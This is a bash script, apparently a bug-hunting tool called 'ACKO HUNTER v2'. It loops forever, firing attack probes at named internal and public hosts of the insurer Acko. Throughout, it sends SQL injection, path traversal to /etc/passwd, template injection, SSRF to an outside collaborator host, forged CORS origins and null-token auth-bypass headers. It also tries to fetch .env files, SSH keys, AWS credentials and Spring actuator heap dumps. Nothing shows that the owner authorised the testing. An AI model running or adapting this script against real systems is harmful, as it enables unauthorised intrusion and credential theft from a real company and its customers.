#!/bin/bash
# ACKO HUNTER v2 - Continuous Fresh Vulnerability Discovery
OUTDIR="/home/sricharansiddu29/recon_reports/companies/acko/unreported"
mkdir -p "$OUTDIR"
C=0
log() { echo "[$(date +%H:%M:%S)] $*" >> /tmp/hunter.log; }

save() {
    local TITLE="$1" SEV="$2" BODY="$3"
    local TS=$(date +%Y%m%d_%H%M%S)
    local NAME=$(echo "$TITLE" | sed 's/[^a-zA-Z0-9]/_/g' | cut -c1-30)
    local HASH=$(echo "$BODY$TITLE" | md5sum | cut -c1-8)
    for f in "$OUTDIR"/*.md; do
        [ -f "$f" ] && grep -q "$HASH" "$f" 2>/dev/null && return
    done
    cat > "$OUTDIR/${SEV}_${NAME}_${TS}.md" <<- EOF
# ${TITLE}
**Time:** $(date '+%Y-%m-%d %H:%M:%S') **Severity:** ${SEV}
${BODY}
_HASH=${HASH}_
EOF
    log "SAVED [${SEV}] ${TITLE}"
}
clean() { tr -d '\0\a\b\f\r' | head -c 300 | tr '\n' ' ' | sed 's/  */ /g'; }
cb() { curl -sk --max-time 8 "$@"; }

P="https://partner-portal.corp.acko.com"
C2="https://cx360v2-backend.corp.acko.com"
CIT="https://central-internal-tools.corp.acko.com"
COV="https://central-one-view.corp.acko.com"
AUTH="https://auth-saml.corp.acko.com"
VEN="https://vendor.corp.acko.com"
FLT="https://fleetops.acko.com"
CX="https://cx360.corp.acko.com"
LD="https://lead360.corp.acko.com"
API="https://api.acko.com"
PA="$P/artemis-api"

log "=== HUNTER v2 STARTED ==="

while true; do
    C=$((C+1))

    # ===== FRESH PROBES EACH CYCLE =====

    # 1. Check ALL known API endpoints (skip SPA HTML responses)
    for EP in "/internal/communications/query" "/internal/bulk-operations/history" \
               "/internal/authentication/token/create" "/internal/authentication/token/verify?token=true" \
               "/internal/partnership/fetch_auth/1" "/internal/document/pre_signed_url/?key_name=test.txt" \
               "/partnership/payment/payin/create_order" "/partnership/payment/payin/refunds?order_id=ORDER-001" \
               "/partnership/payment/payin/verify?order_id=T1" \
               "/partnership/validate_vpa" "/partnership/communication/callback" \
               "/internal/fetch-file-status?file_id=1" "/internal/bulk-operations/template/motor?type=ISSUANCE" \
               "/internal/bulk-operations/status-summary" "/document/1" "/document/test123" \
               "/document/metadata/1" "/job_scheduler/job/get_events" \
               "/email/settings/test" "/v1/uploader-config" "/error"; do
        S=$(cb -w "%{http_code}" -o /tmp/h_ep.txt "$PA$EP" 2>/dev/null)
        B=$(cat /tmp/h_ep.txt 2>/dev/null | clean)
        echo "$B" | grep -qv "doctype\|<!DOCTYPE\|<script\|<html" && \
            [ "$S" != "000" ] && [ "$S" != "404" ] && [ -n "$B" ] && \
            save "EP_STATUS_$(echo $EP | tr '/' '_')" "Info" "HTTP $S | $B"
    done

    # 2. Try HTTP methods that shouldn't work (PUT, PATCH, DELETE)
    for EP in "/internal/communications/query" "/internal/bulk-operations/history" \
               "/document/1" "/partnership/payment/payin/create_order"; do
        for METHOD in "PUT" "PATCH" "DELETE"; do
            S=$(cb -X $METHOD -w "%{http_code}" -o /tmp/h_met.txt "$PA$EP" 2>/dev/null)
            [ "$S" = "200" ] || [ "$S" = "201" ] || [ "$S" = "204" ] && save "METHOD_BYPASS_${METHOD}_$(echo $EP | tr '/' '_')" "Medium" "HTTP $S on $METHOD $EP"
        done
    done

    # 3. SQL Injection probes on parameter endpoints
    for EP in "/document/1'" "/document/1%27" "/partnership/payment/payin/verify?order_id=1'" \
               "/internal/fetch-file-status?file_id=1'" "/internal/partnership/fetch_auth/1'" \
               "/internal/document/pre_signed_url/?key_name=test.txt'"; do
        S=$(cb -w "%{http_code}" -o /tmp/h_sqli.txt "$PA$EP" 2>/dev/null)
        B=$(cat /tmp/h_sqli.txt 2>/dev/null | clean)
        echo "$B" | grep -qiE "sql|syntax|mysql|postgres|error|exception" && save "SQLI_$(echo $EP | tr '/' '_')" "Critical" "HTTP $S | $B"
    done

    # 4. Path traversal probes
    for TRAV in "../" "..%2f" "%2e%2e%2f" "....//....//"; do
        for EP in "/document/${TRAV}etc/passwd" "/internal/document/pre_signed_url/?key_name=${TRAV}etc/passwd"; do
            S=$(cb -w "%{http_code}" -o /tmp/h_trav.txt "$PA$EP" 2>/dev/null)
            B=$(cat /tmp/h_trav.txt 2>/dev/null | clean)
            echo "$B" | grep -qiE "root:|bin/bash|daemon:" && save "PATH_TRAVERSAL_$(echo $EP | tr '/' '_')" "Critical" "HTTP $S | $B"
        done
    done

    # 5. CORS checks on all targets
    for T in $P $C2 $CIT $COV $AUTH $VEN $FLT $CX $LD $API; do
        H=$(cb -I -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" "$T/" 2>/dev/null | head -20)
        echo "$H" | grep -qi "Access-Control-Allow-Origin: https://evil.com" && save "CORS_MISCONFIG_$(echo $T | sed 's|https://||;s|/||')" "High" "Reflects arbitrary origin"
        echo "$H" | grep -qi "Access-Control-Allow-Origin: \*" && save "CORS_WILDCARD_$(echo $T | sed 's|https://||;s|/||')" "Medium" "Wildcard CORS"
    done

    # 6. SSTI on template endpoint
    for SSTI in '{{7*7}}' '#{7*7}' '${{7*7}}' '<%=7*7%>'; do
        S=$(cb -X POST -w "%{http_code}" -o /tmp/h_ssti.txt \
            -H "Content-Type: application/json" \
            -d "{\"identifier\":\"$SSTI\",\"template_name\":\"test\"}" \
            "$PA/internal/service/template/view/pdf" 2>/dev/null)
        B=$(cat /tmp/h_ssti.txt 2>/dev/null | clean)
        echo "$B" | grep -q "49" && save "SSTI_TEMPLATE_ENDPOINT" "Critical" "Template injection detected"
    done

    # 7. New subdomain discovery (only truly responsive ones, skip SPA)
    for SUB in "admin" "api" "app" "cdn" "dev" "docs" "email" "files" "ftp" "git" \
               "internal" "kibana" "logs" "mail" "mfa" "monitor" "portal" "prod" \
               "qa" "sso" "stage" "static" "support" "test" "uat" "vpn" "web" "www"; do
        for DOM in "acko.com" "corp.acko.com" "ackodev.com" "corp.ackodev.com"; do
            BODY=$(cb -o /tmp/h_sub.txt "https://${SUB}.${DOM}/" 2>/dev/null)
            S=$(cb -w "%{http_code}" -o /dev/null "https://${SUB}.${DOM}/" 2>/dev/null)
            [ "$S" = "200" ] || [ "$S" = "301" ] || [ "$S" = "302" ] || [ "$S" = "403" ] && \
                echo "$BODY" | grep -qv "doctype\|<html\|<script" && \
                save "NEW_SUBDOMAIN_${SUB}_${DOM}" "Info" "HTTP $S at https://${SUB}.${DOM}/ | $(echo $BODY | clean | head -c 100)"
        done
    done

    # 8. SSRF probes on callback/webhook endpoints
    for CBEP in "/partnership/communication/callback" "/partnership/communication/v1/test/callback"; do
        S=$(cb -X POST -w "%{http_code}" -o /tmp/h_ssrf.txt \
            -H "Content-Type: application/json" \
            -d '{"url":"http://burpcollaborator.net/test","callback":"http://burpcollaborator.net/test"}' \
            "$PA$CBEP" 2>/dev/null)
        B=$(cat /tmp/h_ssrf.txt 2>/dev/null | clean)
        echo "$B" | grep -qi "callback\|url\|http" && save "SSRF_CALLBACK_$(echo $CBEP | tr '/' '_')" "High" "HTTP $S | $B"
    done

    # 9. Backup/config file discovery (skip SPA HTML responses)
    for BAK in ".env" ".env.bak" ".env.backup" "config.json.bak" "config.backup" \
               "dump.sql" "backup.sql" "db.sql" "database.sql" \
               "appsettings.json" "secrets.json" "credentials.json" \
               ".aws/credentials" ".ssh/id_rsa"; do
        for T in $C2 $CIT $VEN $FLT; do
            S=$(cb -w "%{http_code}" -o /tmp/h_bak.txt "$T/$BAK" 2>/dev/null)
            B=$(cat /tmp/h_bak.txt 2>/dev/null | clean)
            [ "$S" = "200" ] && echo "$B" | grep -qv "doctype\|<!DOCTYPE\|<html\|<script" && \
                save "CONFIG_LEAK_$(echo $T | sed 's|https://||;s|/||')_$(echo $BAK | tr '/' '_')" "Critical" "HTTP $S at $T/$BAK | $B"
        done
    done

    # 10. Auth bypass on protected endpoints (empty/nulled auth headers)
    for HEAD in "Authorization: Bearer" "Authorization: Bearer null" "Authorization: Bearer undefined" \
                "Authorization: null" "Authorization: 0" "Cookie: token=null" "Cookie: session=null" \
                "X-Forwarded-For: 127.0.0.1" "X-Forwarded-Host: localhost"; do
        for EP in "/internal/externaluser/login/otp" "/internal/claim/pre-fileupload" \
                   "/partnership/user/authentication/resource/create" "/internal/ew/document"; do
            S=$(cb -w "%{http_code}" -o /tmp/h_auth.txt -X POST \
                -H "Content-Type: application/json" -H "$HEAD" \
                -d '{}' "$PA$EP" 2>/dev/null)
            B=$(cat /tmp/h_auth.txt 2>/dev/null | clean)
            [ "$S" = "200" ] || [ "$S" = "201" ] || [ "$S" = "204" ] && \
                save "AUTH_BYPASS_$(echo $HEAD | cut -d: -f1)_$(echo $EP | tr '/' '_')" "Critical" "HTTP $S with header: $HEAD | $B"
        done
    done

    # 11. Actuator comprehensive scan
    for ACT in "/actuator" "/actuator/health" "/actuator/info" "/actuator/metrics" \
               "/actuator/mappings" "/actuator/beans" "/actuator/configprops" \
               "/actuator/env" "/actuator/loggers" "/actuator/threaddump" \
               "/actuator/heapdump" "/actuator/conditions" "/actuator/scheduledtasks"; do
        for T in "$PA" "$C2" "$CIT"; do
            S=$(cb -w "%{http_code}" -o /tmp/h_act.txt "$T$ACT" 2>/dev/null)
            B=$(cat /tmp/h_act.txt 2>/dev/null | clean)
            [ "$S" = "200" ] && [ -n "$B" ] && [ "$B" != "{}" ] && \
                save "ACTUATOR_$(echo $T | sed 's|.*\.||;s|\.com.*||')_$(echo $ACT | tr '/' '_')" "Medium" "HTTP $S at $T$ACT | $B"
        done
    done

    # 12. Presigned URL - try to list bucket contents
    URL=$(cb -w "\n%{http_code}" -o /tmp/h_pre.txt \
        "$PA/internal/document/pre_signed_url/?key_name=test.txt" 2>/dev/null | tail -1)
    B=$(head -c 100 /tmp/h_pre.txt 2>/dev/null | clean)
    echo "$B" | grep -q "acko-partners-restricted" && \
        save "S3_PRESIGNED_URL_CONFIRMED" "Critical" "Presigned URL: $B"

    # Report every 5 cycles  
    [ $((C % 5)) -eq 0 ] && log "Cycle $C | $(ls $OUTDIR/*.md 2>/dev/null | wc -l) findings"
    
    sleep 45
done
